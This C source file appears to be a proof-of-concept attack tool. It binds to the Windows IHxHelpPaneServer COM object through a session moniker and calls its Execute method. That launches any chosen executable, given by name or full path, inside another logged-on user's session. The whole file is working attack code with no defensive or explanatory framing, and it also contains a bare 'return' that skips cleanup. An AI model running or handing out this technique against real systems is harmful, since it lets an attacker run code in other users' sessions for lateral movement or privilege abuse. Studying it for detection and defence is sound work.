#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <stdio.h>

// {8CEC592C-07A1-11D9-B15E-000D56BFE6EE}
static const IID IID_IHxHelpPaneServer = { 0x8cec592c, 0x07a1, 0x11d9, {0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee} };

// COM interface definition
typedef struct IHxHelpPaneServerVtbl IHxHelpPaneServerVtbl;

typedef struct IHxHelpPaneServer {
    IHxHelpPaneServerVtbl *lpVtbl;
} IHxHelpPaneServer;

struct IHxHelpPaneServerVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IHxHelpPaneServer*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IHxHelpPaneServer*);
    ULONG   (STDMETHODCALLTYPE *Release)(IHxHelpPaneServer*);

    HRESULT (STDMETHODCALLTYPE *DisplayTask)(IHxHelpPaneServer*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *DisplayContents)(IHxHelpPaneServer*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *DisplaySearchResults)(IHxHelpPaneServer*, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *Execute)(IHxHelpPaneServer*, LPCWSTR);
};

int wmain(int argc, wchar_t *argv[])
{
    HRESULT hr;

    if (argc < 3) {
        wprintf(L"Usage: %s <SessionID> <ExecutablePath>\n", argv[0]);
        return 1;
    }

    int sessionId = _wtoi(argv[1]);
    wchar_t *exeName = argv[2];

    wprintf(L"Executing %s in Session %d\n", exeName, sessionId);

    // Build moniker string
    wchar_t moniker[256];
    swprintf(moniker, 256,
        L"session:%d!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee",
        sessionId);

    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        wprintf(L"CoInitializeEx failed: 0x%08X\n", hr);
        return 1;
    }

    IBindCtx *bindCtx = NULL;
    IMoniker *parsedMoniker = NULL;
    ULONG eaten = 0;

    hr = CreateBindCtx(0, &bindCtx);
    if (FAILED(hr)) {
        wprintf(L"CreateBindCtx failed: 0x%08X\n", hr);
        goto cleanup;
    }

    hr = MkParseDisplayName(bindCtx, moniker, &eaten, &parsedMoniker);
    if (FAILED(hr)) {
        wprintf(L"MkParseDisplayName failed: 0x%08X\n", hr);
        goto cleanup;
    }

    IHxHelpPaneServer *server = NULL;
    hr = parsedMoniker->lpVtbl->BindToObject(parsedMoniker, bindCtx, NULL,
                                             &IID_IHxHelpPaneServer,
                                             (void**)&server);
    if (FAILED(hr)) {
        wprintf(L"BindToObject failed: 0x%08X\n", hr);
        goto cleanup;
    }

	// Build a proper file:/// URI from either a filename or a full path

	wchar_t fullPath[MAX_PATH];
	wchar_t uri[512];

	// Check if exeName is a full Windows path (e.g., C:\Windows\System32\notepad.exe)
	BOOL isFullPath =
		(wcslen(exeName) > 2 &&
		 exeName[1] == L':' &&
		 exeName[2] == L'\\');

	// If not a full path then prepend System32
	if (!isFullPath)
	{
		wchar_t systemPath[MAX_PATH];
		if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_SYSTEM, NULL, 0, systemPath)))
		{
			swprintf(fullPath, MAX_PATH, L"%s\\%s", systemPath, exeName);
		}
		else
		{
			wprintf(L"[!] Failed to resolve System32 path.\n");
			return;
		}
	}
	else
	{
		// Already a full path
		wcsncpy_s(fullPath, MAX_PATH, exeName, _TRUNCATE);
	}

	// Build file:/// URI
	swprintf(uri, 512, L"file:///%s", fullPath);

	// Convert backslashes → forward slashes
	for (int i = 0; uri[i]; i++)
	{
		if (uri[i] == L'\\')
			uri[i] = L'/';
	}

	//wprintf(L"[+] Final URI: %s\n", uri);

	// Execute (existing COM call)
	hr = server->lpVtbl->Execute(server, uri);
	if (FAILED(hr)) {
		wprintf(L"Execute failed: 0x%08X\n", hr);
	}

	server->lpVtbl->Release(server);


cleanup:
    if (parsedMoniker) parsedMoniker->lpVtbl->Release(parsedMoniker);
    if (bindCtx) bindCtx->lpVtbl->Release(bindCtx);

    CoUninitialize();
    return 0;
}
